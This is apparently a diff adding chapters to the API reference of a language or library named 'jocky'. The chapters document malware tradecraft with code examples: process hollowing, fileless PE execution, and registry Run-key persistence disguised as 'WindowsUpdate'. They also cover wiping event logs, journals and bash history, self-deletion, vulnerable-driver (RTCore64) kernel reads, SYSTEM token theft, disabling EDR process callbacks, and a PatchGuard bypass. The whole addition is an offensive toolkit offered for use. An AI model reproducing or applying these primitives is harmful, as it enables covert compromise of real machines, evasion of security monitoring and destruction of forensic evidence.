@@ -1751,3 +1751,318 @@ fn main() -> void {
     jocky_cleanup_all();
 }
 ```
+
+---
+
+## 17  Process Execution & Hollowing  *(Windows & Linux)*
+
+Advanced process manipulation including in-memory execution and process hollowing.
+
+### Windows Process Hollowing → `bool`
+
+```
+ffi jocky_process_hollow(
+    target_image: i8*,       // Target process path (e.g., "C:\\Windows\\notepad.exe")
+    payload: i8*,            // Shellcode/PE to inject
+    payload_size: i64        // Size of payload
+) -> bool;
+```
+
+Replaces a legitimate process image with malicious code:
+1. Create suspended target process
+2. Unmap legitimate image from memory
+3. Allocate at original image base
+4. Write payload (PE or shellcode)
+5. Set entry point and resume
+
+Returns `true` on success.
+
+```jky
+fn main() -> void {
+    let payload: i8* = jocky_alloc(4096);
+    // ... load shellcode into payload ...
+    
+    let ok: bool = jocky_process_hollow(
+        "C:\\Windows\\notepad.exe",
+        payload,
+        4096
+    );
+    
+    jocky_free(payload);
+}
+```
+
+### Windows In-Memory Execution → `bool`
+
+```
+ffi jocky_inmem_execute(
+    binary_data: i8*,        // PE binary in memory
+    binary_size: i64         // Size of PE
+) -> bool;
+```
+
+Execute PE binary directly from memory without touching disk:
+1. Allocate memory for image base
+2. Parse PE headers
+3. Load sections with correct permissions
+4. Relocate imports and fix up IAT
+5. Execute from entry point
+
+Returns `true` on successful execution.
+
+### Linux Process Hollowing → `bool`
+
+```
+ffi jocky_linux_process_hollow(
+    target_binary: i8*,      // Path to target binary
+    new_entry_point: i64     // New execution address
+) -> bool;
+```
+
+Replace process image on Linux systems using `ptrace`:
+1. Attach to target process
+2. Read original mappings via `/proc/[pid]/maps`
+3. Unmap sections with `munmap`
+4. Write new code
+5. Set instruction pointer and detach
+
+---
+
+## 18  Windows Registry Manipulation
+
+Direct Windows registry access and modification.
+
+### Registry Operations
+
+```
+ffi jocky_registry_create_key(
+    hive: i32,               // HKEY_* constant
+    path: i8*,               // Registry path
+    key_out: i8*             // Output key handle
+) -> bool;
+
+ffi jocky_registry_set_value(
+    key: i8*,                // Registry key handle
+    value_name: i8*,         // Value name
+    value_data: i8*,         // Value data
+    data_size: i64,          // Data size
+    type: i32                // REG_SZ, REG_BINARY, etc.
+) -> bool;
+
+ffi jocky_registry_delete_key(
+    hive: i32,
+    path: i8*
+) -> bool;
+
+ffi jocky_registry_close_key(key: i8*) -> void;
+```
+
+**Common HKEY values:**
+- `HKEY_CURRENT_USER` = 0x80000001
+- `HKEY_LOCAL_MACHINE` = 0x80000002
+- `HKEY_CLASSES_ROOT` = 0x80000000
+
+**Value types:**
+- `REG_SZ` = 1 (String)
+- `REG_BINARY` = 3 (Binary)
+- `REG_DWORD` = 4 (32-bit)
+- `REG_QWORD` = 11 (64-bit)
+
+### Registry Persistence Example
+
+```jky
+fn setup_persistence() -> bool {
+    let key: i8* = jocky_alloc(256);
+    
+    let ok: bool = jocky_registry_create_key(
+        0x80000002,  // HKEY_LOCAL_MACHINE
+        "Software\\Microsoft\\Windows\\Run",
+        key
+    );
+    
+    if ok {
+        jocky_registry_set_value(
+            key,
+            "WindowsUpdate",
+            "C:\\ProgramData\\system.exe",
+            32,
+            1  // REG_SZ
+        );
+        jocky_registry_close_key(key);
+    }
+    
+    jocky_free(key);
+    return ok;
+}
+```
+
+---
+
+## 19  Advanced Forensics & Cleanup  *(Windows & Linux)*
+
+Comprehensive artifact elimination beyond basic cleanup.
+
+### Windows Advanced Cleanup
+
+```
+ffi jocky_cleanup_event_logs(
+    log_names: i8*           // Comma-separated log names
+) -> i32;                    // Count of logs cleaned
+
+ffi jocky_cleanup_usn_journal() -> bool;      // USN Journal wipe
+ffi jocky_cleanup_prefetch() -> bool;         // Prefetch cache deletion
+ffi jocky_cleanup_mft_entries(file_path: i8*) -> bool;  // MFT record zeroing
+```
+
+**Example log names:** "Application,Security,System,PowerShell"
+
+### Windows Self-Deletion
+
+```
+ffi jocky_self_delete() -> void;
+```
+
+Remove the running executable from disk:
+1. Make file deletable (remove read-only)
+2. Schedule deletion on next reboot (MoveFileEx with flags)
+3. OR use a helper process + exit
+
+Typically called at end of execution.
+
+### Linux Advanced Cleanup
+
+```
+ffi jocky_linux_cleanup_bash_history() -> bool;
+ffi jocky_linux_cleanup_syslog() -> bool;
+ffi jocky_linux_cleanup_journal() -> bool;
+ffi jocky_linux_cleanup_auth_logs() -> bool;
+```
+
+Wipe activity traces from Linux logging systems.
+
+### Encrypted Artifact Log
+
+```
+ffi jocky_forensics_log_action(
+    action: i8*,             // Description of action taken
+    artifact_path: i8*,      // Path to artifact
+    operation: i8*           // "COPIED", "ENCRYPTED", "DELETED"
+) -> void;
+```
+
+Log all cleanup operations for audit trail. Logs are encrypted with AES-256 and stored in audit buffer.
+
+---
+
+## 20  Driver Interaction & DeviceIoControl  *(Windows, requires BYOVD)*
+
+Low-level communication with loaded kernel drivers.
+
+```
+ffi jocky_driver_ioctl(
+    driver_handle: i8*,      // Handle from jocky_byovd_load
+    ioctl_code: i32,         // Device I/O control code
+    input_buffer: i8*,       // Input data
+    input_size: i64,         // Input size
+    output_buffer: i8*,      // Output buffer
+    output_size: i64,        // Output buffer size
+    bytes_returned: i64*     // Bytes written to output
+) -> bool;
+```
+
+Send commands directly to kernel driver.
+
+### Example: Read Kernel Memory via BYOVD
+
+```jky
+fn read_kernel_memory(address: i64, size: i64) -> i8* {
+    let ctx: i8* = jocky_byovd_new();
+    let ok: bool = jocky_byovd_load("RTCore64", "RTCore64", ctx);
+    
+    if !ok {
+        jocky_free(ctx);
+        return null;
+    }
+    
+    let buffer: i8* = jocky_alloc(size);
+    let bytes_read: i64 = 0;
+    
+    let result: bool = jocky_driver_ioctl(
+        ctx,
+        0x82000000,      // IOCTL for RTCore64
+        address as i8*,  // Kernel address to read
+        8,               // Size of address
+        buffer,          // Output buffer
+        size,
+        &bytes_read
+    );
+    
+    jocky_byovd_destroy(ctx);
+    return buffer;
+}
+```
+
+---
+
+## 21  Exploitation Framework  *(Windows, requires BYOVD & Driver Support)*
+
+Complete kernel exploitation primitives for privilege escalation and system control.
+
+### Kernel Read/Write Primitives
+
+```
+ffi jocky_kernel_read(
+    address: i64,            // Kernel virtual address
+    size: i64                // Bytes to read
+) -> i8*;                    // Allocated buffer (free with jocky_free)
+
+ffi jocky_kernel_write(
+    address: i64,            // Kernel virtual address
+    data: i8*,               // Data to write
+    size: i64                // Bytes to write
+) -> bool;
+```
+
+**Requirements:**
+- `jocky_byovd_load()` must succeed
+- Driver must support arbitrary memory I/O (RTCore64, NVIDIA, EVGA, etc.)
+- Administrator privileges required
+
+### Token Manipulation (Privilege Escalation)
+
+```
+ffi jocky_exploit_token_replacement(
+    source_pid: i32,         // Process to steal token from (0 = System)
+    target_pid: i32          // Process to give token to (0 = self)
+) -> bool;
+```
+
+Replace process token with SYSTEM token:
+1. Locate EPROCESS structures for source/target
+2. Read source token
+3. Write to target EPROCESS
+4. Verify elevation
+
+### Process Control Block Manipulation
+
+```
+ffi jocky_exploit_disable_callbacks() -> bool;
+```
+
+Disable kernel callback notifications:
+1. Find PspCreateProcessNotifyRoutine table
+2. Zero out callback pointers
+3. Disables process creation monitoring
+
+### PatchGuard Bypass
+
+```
+ffi jocky_exploit_disable_patchguard() -> bool;
+```
+
+Temporarily disable Windows PatchGuard (Kernel Patch Protection):
+1. Detect HVCI support
+2. Exploit known vulnerable paths
+3. Set flag to disable checks
+
+Returns `false` on Windows 11 with HVCI hardened.
